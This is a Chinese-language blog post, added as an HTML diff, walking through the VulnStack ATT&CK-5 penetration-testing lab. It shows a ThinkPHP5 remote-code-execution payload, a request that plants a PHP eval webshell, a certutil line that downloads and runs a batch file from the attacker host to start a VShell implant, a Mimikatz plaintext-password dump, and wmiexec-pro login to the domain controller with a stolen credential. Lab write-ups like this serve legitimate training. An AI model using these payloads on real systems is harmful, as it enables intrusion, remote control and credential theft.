@@ -1,0 +1,67 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="VulnStack-ATT&amp;CK-5"><meta name="keywords" content=""><meta name="author" content="山野人"><meta name="copyright" content="山野人"><title>VulnStack-ATT&amp;CK-5 | 山野人</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  hexoVersion: '7.1.1'
+} </script><meta name="generator" content="Hexo 7.1.1"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GetShell"><span class="toc-number">1.2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE"><span class="toc-number">1.3.</span> <span class="toc-text">查网络配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VShell%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%BC%80%E9%9A%A7%E9%81%93"><span class="toc-number">1.4.</span> <span class="toc-text">VShell连接和开隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81"><span class="toc-number">1.5.</span> <span class="toc-text">获取明文密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#wmiexec-pro%E7%99%BB%E5%BD%95DC"><span class="toc-number">2.1.</span> <span class="toc-text">wmiexec-pro登录DC</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">山野人</div><div class="author-info__description text-center">日落山水静 为君起松声</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">10</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">山野人</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">VulnStack-ATT&amp;CK-5</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2024-09-21</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="服务器渗透"><a href="#服务器渗透" class="headerlink" title="服务器渗透"></a>服务器渗透</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -n -v 192.168.3.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921224047375.png" alt="image-20240921224047375"></p>
+<p>访问192.168.3.6的80端口，发现是thinkphp5，存在RCE漏洞，利用方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/index.php?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=%3c%3fphp+%40eval(%24_POST%5b%27cmd%27%5d)%3b%3f%3e</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接地址<code>http://192.168.3.6/shell.php</code>，连接密码<code>cmd</code></p>
+<h3 id="查网络配置"><a href="#查网络配置" class="headerlink" title="查网络配置"></a>查网络配置</h3><p>连接后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921225631721.png" alt="image-20240921225631721"></p>
+<p>发现在域中，有一张内网网卡</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping sun.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921233012848.png" alt="image-20240921233012848"></p>
+<p>域控DC为192.168.138.138</p>
+<h3 id="VShell连接和开隧道"><a href="#VShell连接和开隧道" class="headerlink" title="VShell连接和开隧道"></a>VShell连接和开隧道</h3><p><img src="/pic/image-20240921233644133.png" alt="image-20240921233644133"></p>
+<p>在蚁剑中执行上线命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://192.168.3.3:10012/swt C:\Users\Public\run.bat &amp;&amp; C:\Users\Public\run.bat</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921233757577.png" alt="image-20240921233757577"></p>
+<p>上线成功，开启隧道，端口6005，并且配置&#x2F;etc&#x2F;proxychains.conf的socks5</p>
+<p><img src="/pic/image-20240921233855690.png" alt="image-20240921233855690"></p>
+<h3 id="获取明文密码"><a href="#获取明文密码" class="headerlink" title="获取明文密码"></a>获取明文密码</h3><p>将mimikatz.exe上传到靶机，并且执行下面命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe log privilege::debug sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921234321210.png" alt="image-20240921234321210"></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="wmiexec-pro登录DC"><a href="#wmiexec-pro登录DC" class="headerlink" title="wmiexec-pro登录DC"></a>wmiexec-pro登录DC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec-pro.py &#x27;Administrator:dc123.com@192.168.138.138&#x27; exec-command -shell</span><br></pre></td></tr></table></figure>
+
+<p><img src="/pic/image-20240921234528680.png" alt="image-20240921234528680"></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">山野人</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-5/">http://lxy00.top/2024/09/21/VulnStack-ATT&amp;CK-5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://lxy00.top">山野人</a>！</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="next-post pull-right"><a href="/2024/09/21/VulnStack-ATT&amp;CK-4/"><span>VulnStack-ATT&amp;CK-4</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'false' == 'true';
+var verify = 'false' == 'true';
+var record_ip = 'false' == 'true';
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  recordIP:record_ip,
+  appId:'Bnr1wLZ3jY69sAXABKBTt5TO-gzGzoHsz',
+  appKey:'loLNR3sesNkuhCMjtzlb2g1d',
+  placeholder:'请你不要 diss 我',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang: 'zh-cn'
+})</script></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2022 - 2024 By 山野人</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Hi, welcome to my <a target="_blank" rel="noopener" href="https://github.com/Yllxx03">Github</a>!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.1"></script><script src="/js/fancybox.js?version=1.9.1"></script><script src="/js/sidebar.js?version=1.9.1"></script><script src="/js/copy.js?version=1.9.1"></script><script src="/js/fireworks.js?version=1.9.1"></script><script src="/js/transition.js?version=1.9.1"></script><script src="/js/scroll.js?version=1.9.1"></script><script src="/js/head.js?version=1.9.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script></body></html>
